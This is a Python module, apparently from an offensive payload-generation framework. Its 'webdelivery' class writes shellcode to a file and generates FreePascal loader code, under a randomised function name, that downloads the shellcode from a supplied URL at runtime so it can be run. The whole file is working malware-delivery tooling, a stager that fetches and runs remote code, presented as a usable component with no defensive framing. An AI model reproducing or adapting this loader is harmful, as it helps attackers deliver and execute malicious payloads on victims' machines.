import random
import string
from c.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        shellcodetype = type(shellcode).__name__
        if shellcodetype == 'bytes':
            open(outfile, 'wb').write(shellcode)
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return ['fphttpclient', 'ssockets']

    def compilerOptions(self) -> list[str]:
        return ['-gl', '-gh', '-Criot']

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        return f"""
function {self.name}: TBytes;
var
    client: TFPHttpClient;
    stream: TBytesStream;

begin
    stream := TBytesStream.create;
    client := TFPHttpClient.Create(nil);
    try
        client.get('{self.url}', stream);
        SetLength(Result, stream.Size);
        Move(stream.bytes[0], Result[0], stream.size);
    finally
        stream.Free;
        client.free;
    end;
end;
"""
